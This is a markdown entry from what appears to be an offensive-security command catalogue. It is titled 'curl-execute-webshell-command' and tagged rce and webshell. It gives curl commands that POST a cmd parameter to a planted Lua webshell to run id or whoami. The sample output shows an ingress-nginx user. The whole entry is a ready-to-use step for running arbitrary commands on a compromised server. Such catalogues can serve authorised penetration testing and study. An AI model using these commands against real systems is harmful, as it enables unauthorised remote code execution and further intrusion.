---
data: 'curl localhost/z/ -H "host: x.x" -d "cmd=id"'
tags:
  - rce
  - webshell
type: command
output: 'Output of ''id'' command, e.g., uid=...'
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.872Z'
id: 60d904e7-a4f4-4957-af54-b904fdc51a29
verified: false
validated: true
submitted: true
---
# curl-execute-webshell-command

## Command

```bash
curl localhost/z/ -H "host: x.x" -d "cmd=id"
```

## Description

Executes an arbitrary command via the Lua webshell by POSTing the cmd parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "host: x.x"` | Host header for routing | Yes |
| `-d "cmd=id"` | POST data with command to execute | Yes |

## Examples

### Basic Usage

```bash
curl localhost/z/ -H "host: x.x" -d "cmd=id"
```

### Advanced Usage

```bash
curl localhost/z/ -H "host: x.x" -d "cmd=whoami" -X POST
```

## Expected Output

Command stdout, e.g., "uid=2000(ingress-nginx) ...".

## Related

- [[procedures/Execute-Arbitrary-Commands-via-Webshell]]
